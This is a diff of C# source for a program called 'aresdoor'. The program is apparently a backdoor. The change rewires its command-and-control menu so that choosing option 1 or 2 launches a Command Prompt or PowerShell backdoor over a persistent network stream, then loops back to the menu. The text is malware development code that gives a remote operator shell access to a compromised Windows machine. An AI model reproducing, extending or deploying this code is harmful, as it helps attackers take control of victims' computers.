@@ -237,6 +237,8 @@ namespace aresdoor
                         // Write in loop for a persistant connection
                         while (true)
                         {
+                            candcmenu:
+
                             string aresdoorStartMenu = string.Empty;
                             string responseFromServer = string.Empty;
                             
@@ -261,11 +263,21 @@ namespace aresdoor
                             responseFromServer = responseFromServer.Replace("\n", string.Empty).Replace(" ", string.Empty);
 
                             if (responseFromServer == "1")
+                            {
                                 nc.dataTravelTO(stream, "You've selected 'Command Prompt Backdoor'\n");
+                                while (BackdoorCollection.CommandPromptBackdoor(stream)) { }
+                                goto candcmenu;                                
+                            }
                             else if (responseFromServer == "2")
+                            {
                                 nc.dataTravelTO(stream, "You've selected 'Powershell Backdoor'\n");
+                                while (BackdoorCollection.PowershellBackdoor(stream)) { }
+                                goto candcmenu;
+                            }
                             else if (responseFromServer == "3" || responseFromServer == "exit")
+                            {
                                 nc.dataTravelTO(stream, "You've selected 'Exit'\n");
+                            }
                             else if (responseFromServer == "")
                                 goto optionInputDisplay;
                             else
